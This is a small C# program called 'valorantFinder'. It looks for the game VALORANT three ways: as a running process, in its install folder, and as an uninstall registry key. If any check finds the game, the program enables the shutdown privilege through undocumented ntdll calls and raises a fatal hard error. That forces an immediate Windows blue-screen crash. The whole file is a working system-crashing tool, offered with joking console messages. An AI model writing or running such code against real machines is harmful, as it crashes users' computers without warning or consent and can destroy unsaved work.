using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace valorantFinder;


internal class Program {

    public enum NTStatus : uint // a little bit (src http://deusexmachina.uk/ntstatus.html)
    {
        STATUS_ASSERTION_FAILURE = 0xC0000420
    }


    public enum Privilege {
        SeShutdownPrivilege = 19
    }
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern IntPtr RtlAdjustPrivilege(Privilege privilege /*int Privilege*/, bool bEnablePrivilege,
        bool IsThreadPrivilege, out bool PreviousValue);


    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(
        NTStatus ErrorStatus /*uint ErrorStatus*/,
        uint NumberOfParameters,
        uint UnicodeStringParameterMask,
        IntPtr Parameters,
        uint ValidResponseOption,
        out uint Response
    );
    private static bool KeyExists(RegistryKey baseKey, string subKeyName)
    {
        RegistryKey ret = baseKey.OpenSubKey(subKeyName);

        return ret != null;
    }
    static void Main() {
        var processList = Process.GetProcessesByName("VALORANT");
        RtlAdjustPrivilege(Privilege.SeShutdownPrivilege, true, false, out bool previousValue);
        if (processList.Length > 0) {
            NtRaiseHardError(NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        else {
            Console.WriteLine("valorant isn't running. nice.");
        }
        if (Directory.Exists("C:/Program Files/Riot Games/VALORANT")) {
            NtRaiseHardError(NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        else {
            Console.WriteLine("no val found. nice. moving on to other methods");
        }
        if (KeyExists(Registry.CurrentUser, $"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Riot Game valorant.live")) {
            NtRaiseHardError(NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        else {
            Console.WriteLine("no valorant at all. nice");
        }
}
}
